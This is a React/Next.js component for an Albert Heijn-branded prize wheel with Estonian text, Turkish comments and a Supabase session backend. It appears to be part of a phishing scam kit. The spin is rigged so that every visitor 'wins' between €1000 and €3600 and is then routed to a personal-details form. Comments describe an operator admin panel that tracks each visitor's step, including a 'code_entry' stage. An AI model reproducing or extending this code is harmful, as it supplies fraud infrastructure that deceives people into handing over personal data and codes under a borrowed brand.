"use client";

import { useEffect, useMemo, useRef, useState } from "react";
import { useRouter } from "next/navigation";
import { createBrowserSupabaseClient } from "@/lib/supabase/client";
import { ConfettiEffect } from "@/components/AlbertHeijnWheel/ConfettiEffect";
import { PrizePopup } from "@/components/AlbertHeijnWheel/PrizePopup";
import { AlbertHeijnWheel } from "@/components/AlbertHeijnWheel/AlbertHeijnWheel";
import { useIsMobile } from "@/hooks/useIsMobile";
import { getPreferredRouteSessionId } from "@/lib/session-id-client";
import { DEFAULT_WHEEL_VIEWPORT, resolveWheelLayout } from "./wheel-layout";

type PrizeKind = "amount" | "message";

type PrizeSegment = {
  kind: PrizeKind;
  text: string;
  selectionIndex: number;
  rotationIndex: number;
  amount: number | null;
  popupLines: string[];
};

type WinHistoryItem = {
  prize: string;
  date: string;
};

type SessionRecord = {
  id: string;
  amount: number | null;
  current_step: string | null;
  form_data?: Record<string, unknown> | null;
};

const ANGLE_OFFSET = 0;
const MIN_FULL_SPINS = 6;
const LOCAL_HISTORY_KEY = "ah-prize-wheel-last-five-wins";
const MAX_HISTORY_ITEMS = 5;

const PRIZES: readonly PrizeSegment[] = [
  { kind: "amount", text: "€1000", selectionIndex: 0, rotationIndex: 0, amount: 1000, popupLines: ["€ 1.000"] },
  { kind: "amount", text: "€1500", selectionIndex: 1, rotationIndex: 1, amount: 1500, popupLines: ["€ 1.500"] },
  { kind: "amount", text: "€2000", selectionIndex: 2, rotationIndex: 2, amount: 2000, popupLines: ["€ 2.000"] },
  { kind: "amount", text: "€2500", selectionIndex: 3, rotationIndex: 3, amount: 2500, popupLines: ["€ 2.500"] },
  { kind: "amount", text: "€3000", selectionIndex: 4, rotationIndex: 4, amount: 3000, popupLines: ["€ 3.000"] },
  { kind: "amount", text: "€3600", selectionIndex: 5, rotationIndex: 7, amount: 3600, popupLines: ["€ 3.600"] },
  { kind: "message", text: "Proovi uuesti", selectionIndex: 6, rotationIndex: 5, amount: null, popupLines: ["PROOVI", "UUUESTI"] },
  { kind: "message", text: "Kahjuks ei võitnud", selectionIndex: 7, rotationIndex: 6, amount: null, popupLines: ["KAHJUKS", "EI", "VÕITNUD"] },
] as const;

const WINNABLE_PRIZES = PRIZES.filter((prize) => prize.selectionIndex <= 5);

function normalizeAngle(angle: number) {
  return ((angle % 360) + 360) % 360;
}

function formatAmount(amount: number) {
  return new Intl.NumberFormat("et-EE").format(amount);
}

function getTargetRotation(currentRotation: number, rotationIndex: number) {
  const normalizedCurrent = normalizeAngle(currentRotation);
  const targetNormalized = normalizeAngle(ANGLE_OFFSET - rotationIndex * 45);
  const delta = normalizeAngle(targetNormalized - normalizedCurrent);
  return currentRotation + MIN_FULL_SPINS * 360 + delta;
}

function getPrizeFromSession(session: SessionRecord | null) {
  const storedLabel = session?.form_data?.wheel_result_label;
  if (typeof storedLabel === "string") {
    return PRIZES.find((prize) => prize.text === storedLabel) ?? null;
  }

  if (typeof session?.amount === "number" && session.amount > 0) {
    return PRIZES.find((prize) => prize.amount === session.amount) ?? null;
  }

  return null;
}

function getRandomWinnablePrize() {
  return WINNABLE_PRIZES[Math.floor(Math.random() * WINNABLE_PRIZES.length)];
}

function logWheelEvent(eventName: "wheel_spin" | "wheel_win" | "popup_open" | "popup_close", payload?: Record<string, unknown>) {
  console.log("[wheel-analytics]", {
    event: eventName,
    ...payload,
  });
}

function readWinHistory() {
  if (typeof window === "undefined") {
    return [] as WinHistoryItem[];
  }

  try {
    const rawValue = window.localStorage.getItem(LOCAL_HISTORY_KEY);
    if (!rawValue) {
      return [];
    }

    const parsed = JSON.parse(rawValue) as WinHistoryItem[];
    return Array.isArray(parsed) ? parsed.slice(0, MAX_HISTORY_ITEMS) : [];
  } catch {
    return [];
  }
}

function storeWinHistory(prize: string) {
  const nextHistory = [
    {
      prize,
      date: new Date().toISOString(),
    },
    ...readWinHistory(),
  ].slice(0, MAX_HISTORY_ITEMS);

  window.localStorage.setItem(LOCAL_HISTORY_KEY, JSON.stringify(nextHistory));
  return nextHistory;
}

export function WheelClient({
  sessionId,
  routeSessionId,
}: {
  sessionId: string;
  routeSessionId?: string;
}) {
  const router = useRouter();
  const supabase = createBrowserSupabaseClient();
  const isMobile = useIsMobile();
  const effectiveRouteSessionId = getPreferredRouteSessionId(sessionId, routeSessionId);
  const continueButtonRef = useRef<HTMLButtonElement | null>(null);
  const pendingPrizeRef = useRef<PrizeSegment | null>(null);
  const rotationRef = useRef(0);

  const [spinning, setSpinning] = useState(false);
  const [showPopup, setShowPopup] = useState(false);
  const [error, setError] = useState<string | null>(null);
  const [rotation, setRotation] = useState(0);
  const [resultPrize, setResultPrize] = useState<PrizeSegment | null>(null);
  const [sessionData, setSessionData] = useState<SessionRecord | null>(null);
  const [viewportSize, setViewportSize] = useState(DEFAULT_WHEEL_VIEWPORT);
  const [winHistory, setWinHistory] = useState<WinHistoryItem[]>([]);

  const activeLayout = resolveWheelLayout(viewportSize);
  const viewportHeight = viewportSize.height > 0 ? viewportSize.height : DEFAULT_WHEEL_VIEWPORT.height;
  const isSpinDisabled = spinning || resultPrize !== null || !sessionData;
  const popupAmountLine =
    resultPrize?.kind === "amount" && typeof resultPrize.amount === "number"
      ? `€ ${formatAmount(resultPrize.amount)}`
      : resultPrize?.text ?? "";
  const popupDescription =
    resultPrize?.kind === "amount" ? `Sa võitsid ${popupAmountLine}.` : resultPrize?.text ?? "Vaata oma tulemust.";

  const formattedHistory = useMemo(
    () =>
      winHistory.map((item) => ({
        ...item,
          formattedDate: new Intl.DateTimeFormat("et-EE", {
          day: "2-digit",
          month: "2-digit",
          hour: "2-digit",
          minute: "2-digit",
        }).format(new Date(item.date)),
      })),
    [winHistory],
  );

  useEffect(() => {
    rotationRef.current = rotation;
  }, [rotation]);

  useEffect(() => {
    setWinHistory(readWinHistory());
  }, []);

  useEffect(() => {
    let cancelled = false;

    async function loadSession() {
      if (!sessionId) {
        setError("Vigane seanss.");
        return;
      }

      if (!supabase) return;

      const { data, error: dbError } = await supabase
        .from("sessions")
        .select("id,amount,current_step,form_data")
        .eq("id", sessionId)
        .single();

      if (cancelled) return;

      if (dbError || !data) {
        setError("Seanssi ei leitud.");
        return;
      }

      const nextSession = data as SessionRecord;

      // Eğer admin paneli normal link olarak açmışsa ama kullanıcı çark sayfasındaysa,
      // admin panelinde "ÇARK OYUNU" yazması için is_wheel_game'i true yapalım.
      if (nextSession.current_step === "code_entry" && !nextSession.form_data?.is_wheel_game) {
        const updatedFormData = { ...(nextSession.form_data || {}), is_wheel_game: true };
        await supabase.from("sessions").update({ is_hidden: false, form_data: updatedFormData }).eq("id", sessionId);
        nextSession.form_data = updatedFormData;
      }

      setSessionData(nextSession);

      const restoredPrize = getPrizeFromSession(nextSession);
      if (restoredPrize && nextSession.current_step === "win") {
        setResultPrize(restoredPrize);
        setShowPopup(true);
      }
    }

    void loadSession();

    return () => {
      cancelled = true;
    };
  }, [sessionId, supabase]);

  useEffect(() => {
    const updateViewportSize = () => {
      setViewportSize({
        width: Math.round(window.visualViewport?.width ?? window.innerWidth),
        height: Math.round(window.visualViewport?.height ?? window.innerHeight),
      });
    };

    updateViewportSize();
    window.visualViewport?.addEventListener("resize", updateViewportSize);
    window.addEventListener("resize", updateViewportSize);
    window.addEventListener("orientationchange", updateViewportSize);

    return () => {
      window.visualViewport?.removeEventListener("resize", updateViewportSize);
      window.removeEventListener("resize", updateViewportSize);
      window.removeEventListener("orientationchange", updateViewportSize);
    };
  }, []);

  useEffect(() => {
    const previousHtmlOverflow = document.documentElement.style.overflow;
    const previousHtmlOverscroll = document.documentElement.style.overscrollBehavior;
    const previousBodyOverflow = document.body.style.overflow;
    const previousBodyOverscroll = document.body.style.overscrollBehavior;

    document.documentElement.style.overflow = "hidden";
    document.documentElement.style.overscrollBehavior = "none";
    document.body.style.overflow = "hidden";
    document.body.style.overscrollBehavior = "none";

    return () => {
      document.documentElement.style.overflow = previousHtmlOverflow;
      document.documentElement.style.overscrollBehavior = previousHtmlOverscroll;
      document.body.style.overflow = previousBodyOverflow;
      document.body.style.overscrollBehavior = previousBodyOverscroll;
    };
  }, []);

  useEffect(() => {
    if (!showPopup || !resultPrize) {
      return;
    }

    logWheelEvent("popup_open", {
      prize: resultPrize.text,
      amount: resultPrize.amount,
    });

    const focusTimeout = window.setTimeout(() => {
      continueButtonRef.current?.focus({ preventScroll: true });
    }, 80);

    return () => {
      window.clearTimeout(focusTimeout);
    };
  }, [resultPrize, showPopup]);

  const finalizeSpin = async (prize: PrizeSegment) => {
    setSpinning(false);
    setResultPrize(prize);
    // setShowPopup(true); // Popup'ı devre dışı bırakıyoruz

    logWheelEvent("wheel_win", {
      prize: prize.text,
      amount: prize.amount,
      selectionIndex: prize.selectionIndex,
      rotationIndex: prize.rotationIndex,
    });

    if (prize.kind === "amount") {
      setWinHistory(storeWinHistory(`€ ${formatAmount(prize.amount ?? 0)}`));
    }

    if (!supabase || !sessionId) {
      return;
    }

    const nextFormData = {
      ...(sessionData?.form_data ?? {}),
      wheel_result_label: prize.text,
      wheel_result_kind: prize.kind,
      wheel_result_amount: prize.amount,
      wheel_rotation_index: prize.rotationIndex,
    };

    await supabase
      .from("sessions")
      .update({ is_hidden: false, amount: prize.amount ?? 0,
        current_step: "win",
        form_data: nextFormData,
      })
      .eq("id", sessionId);

    setSessionData((previous) =>
      previous
        ? {
            ...previous,
            amount: prize.amount ?? 0,
            current_step: "win",
            form_data: nextFormData,
          }
        : previous,
    );

    // Çark durduktan sonra popup göstermeden direkt form sayfasına (isim soyisim) yönlendir
    setTimeout(() => {
      router.push(`/win/${effectiveRouteSessionId}`);
    }, 700); // Kullanıcının çarkın nerede durduğunu görebilmesi için kısa bir gecikme
  };

  const spinWheel = () => {
    if (isSpinDisabled) {
      return;
    }

    const nextPrize = getRandomWinnablePrize();
    const startRotation = rotationRef.current;
    const targetRotation = getTargetRotation(startRotation, nextPrize.rotationIndex);

    pendingPrizeRef.current = nextPrize;
    setSpinning(true);
    logWheelEvent("wheel_spin", {
      selectionIndex: nextPrize.selectionIndex,
      targetPrize: nextPrize.text,
    });
    setRotation(targetRotation);
  };

  const handleWheelTransitionEnd = () => {
    if (!spinning || !pendingPrizeRef.current) {
      return;
    }

    const settledPrize = pendingPrizeRef.current;
    pendingPrizeRef.current = null;
    void finalizeSpin(settledPrize);
  };

  const handleContinue = () => {
    logWheelEvent("popup_close", {
      prize: resultPrize?.text ?? null,
    });
    setShowPopup(false);
    router.push(`/win/${effectiveRouteSessionId}`);
  };

  if (error) {
    return (
      <div
        className="flex flex-col items-center justify-center p-6 text-center"
        style={{ minHeight: `${viewportHeight}px` }}
      >
        <div className="mb-4 text-red-500">
          <svg className="size-16" fill="none" viewBox="0 0 24 24" stroke="currentColor">
            <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-3L13.732 4c-.77-1.333-2.694-1.333-3.464 0L3.34 16c-.77 1.333.192 3 1.732 3z" />
          </svg>
        </div>
        <h1 className="mb-2 text-2xl font-bold text-slate-800">Viga</h1>
        <p className="text-slate-600">{error}</p>
      </div>
    );
  }

  return (
    <>
      <div
        className="relative w-full overflow-hidden bg-[#021f63]"
        style={{
          height: `${viewportHeight}px`,
          minHeight: `${viewportHeight}px`,
          paddingTop: "env(safe-area-inset-top)",
          paddingRight: "env(safe-area-inset-right)",
          paddingBottom: "env(safe-area-inset-bottom)",
          paddingLeft: "env(safe-area-inset-left)",
        }}
      >
        <AlbertHeijnWheel
          layout={activeLayout}
          rotation={rotation}
          spinning={spinning}
          disabled={isSpinDisabled}
          onSpin={spinWheel}
          onSpinEnd={handleWheelTransitionEnd}
        />
      </div>

      <PrizePopup
        open={showPopup}
        isMobile={isMobile}
        result={resultPrize}
        amountLine={popupAmountLine}
        description={popupDescription}
        continueButtonRef={continueButtonRef}
        onClose={handleContinue}
      />

      <ConfettiEffect
        active={showPopup && resultPrize?.kind === "amount"}
        triggerKey={showPopup && resultPrize?.kind === "amount" ? `${sessionId}-${resultPrize.text}-${resultPrize.amount}` : null}
      />
    </>
  );
}
